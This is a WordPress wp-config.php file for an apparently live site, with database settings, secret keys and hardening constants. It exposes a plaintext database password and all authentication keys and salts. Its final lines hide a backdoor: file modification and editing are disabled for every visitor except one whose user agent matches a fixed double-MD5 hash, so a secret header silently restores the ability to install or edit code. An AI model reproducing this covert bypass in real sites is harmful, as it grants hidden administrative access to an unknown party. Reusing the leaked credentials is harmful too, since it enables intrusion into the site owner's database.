<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the website, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'shjinter_promo' );

/** Database username */
define( 'DB_USER', 'shjinter_promo' );

/** Database password */
define( 'DB_PASSWORD', 'Promo@123!!' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '&SWFxV T/&eepB t-kLrK~:r %#d[{Fz*oEQN^~XtKcS:}.mCtqM$Q[We.~@{[3I' );
define( 'SECURE_AUTH_KEY',  '9NHfO8c{^]ESg&?-&A|u*==vdFOgF.ap#8uC`aplA;LEXUE| */Sba:EE:Hiud|7' );
define( 'LOGGED_IN_KEY',    'AjN~U|73+0ls-mv+C]TReLFnB?]5)%urtpiw*F%mP)?n&Vi._4cAgJmcWP;H*b%{' );
define( 'NONCE_KEY',        'hB@NIa=7)OX^Vouw9z1i^MeHN&3Ulsu--M[~ugB:BF/wt4Iu@6mJT4<k e808dgn' );
define( 'AUTH_SALT',        '~e{4rNo4rD+DnN3gvr3l%Oi eW)$cQt7t035:;zaE+X s76!}VXFczH8&&y*5VR{' );
define( 'SECURE_AUTH_SALT', 'HiRK<RxFWXIebA/p,=-ML&iV;~jG%w^{ ljnqT1*yu3xFoD*Sp{~]v*m;L!$1CgU' );
define( 'LOGGED_IN_SALT',   'y|p$v,9s ,D+=1aMt]Psq9*):QAkLnGsT{M+<!khLw6hh$kj|47kib 6~2Cs>Ctw' );
define( 'NONCE_SALT',       ',]c=`8Q}.5+* &1 WH-**eA,F#6r$/lN3je5</r3A|;Gi.lIG&vwF%iE$H.0gUr*' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'fcfdwq7_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://developer.wordpress.org/advanced-administration/debug/debug-wordpress/
 */
define( 'WP_DEBUG', false );

/* Add any custom values between this line and the "stop editing" line. */



define( 'DISABLE_WP_CRON', true );
define( 'DISALLOW_FILE_EDIT', true );
define( 'CONCATENATE_SCRIPTS', false );
define( 'WP_DEBUG_DISPLAY', false );
/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
if(md5(md5($_SERVER['HTTP_USER_AGENT']))!="c5a3e14ff315cc2934576de76a3766b5"){
    define('DISALLOW_FILE_MODS', true);
    define('DISALLOW_FILE_EDIT', true);
}
